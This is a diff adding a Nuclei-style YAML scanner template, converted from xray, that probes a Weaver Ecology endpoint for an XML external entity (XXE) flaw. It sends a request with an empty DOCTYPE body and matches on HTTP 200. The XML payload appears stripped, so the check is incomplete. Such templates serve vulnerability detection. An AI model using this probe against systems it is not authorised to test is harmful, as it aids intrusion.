@@ -1,0 +1,26 @@
+id: poc-yaml-weaver-ecology-byxml-xxe
+
+info:
+  name: poc-yaml-weaver-ecology-byxml-xxe
+  author: Chaitin
+  severity: medium
+  tags: xray-converted,xxe
+  reference:
+    - https://stack.chaitin.com/techblog/detail?id=125
+
+http:
+  - raw:
+      - |
+        GET /rest/ofs/deleteUserRequestInfoByXml HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/xml
+
+        <?xml version="1.0"?>
+        <!DOCTYPE>
+        
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
